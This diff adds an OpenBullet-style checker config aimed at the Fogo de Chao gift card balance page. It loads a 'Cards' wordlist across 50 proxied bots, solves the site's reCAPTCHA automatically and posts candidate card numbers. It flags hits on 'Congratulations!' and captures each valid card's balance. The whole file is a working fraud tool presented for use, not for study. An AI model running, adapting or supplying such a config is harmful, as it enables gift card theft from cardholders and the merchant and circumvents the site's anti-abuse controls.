@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "FOGODECHAO",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-08T13:46:42.39844+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_PAGE REQUEST GET "https://fogodechao.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_FIRSTRANDOM PARSE "<SOURCE>" LR "action=\"/guest/nologin/account-balance\" role=\"form\" class=\"form-horizontal\"><input value=\"true\" type=\"hidden\" name=\"" "\">" Recursive=FALSE -> VAR "FIRSTRANDOM" "" "" 
+#PARSE_SECONDRANDOM PARSE "<SOURCE>" LR "class=\"btn btn-default nologinCardnumberSubmitButton\" name=\"" "\">Submit</button>" Recursive=FALSE -> VAR "SECONDRANDOM" "" "" 
+RECAPTCHA "https://fogodechao.myguestaccount.com/guest/nologin/account-balance" "6LdndBYUAAAAAIE_sQA2y29GSRaKJHKx2DodPT6m" -> VAR "RECAPTCHA" 
+#POST_GC_DETAILS REQUEST POST "https://fogodechao.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "<FIRSTRANDOM>=true&cardnum=<USER>&g-recaptcha-response=<RECAPTCHA>&<SECONDRANDOM>=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Congratulations!" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid card number." 
+PARSE "<SOURCE>" LR "\">
+                      " "." Recursive=FALSE -> CAP "BALANCE" "" "" 
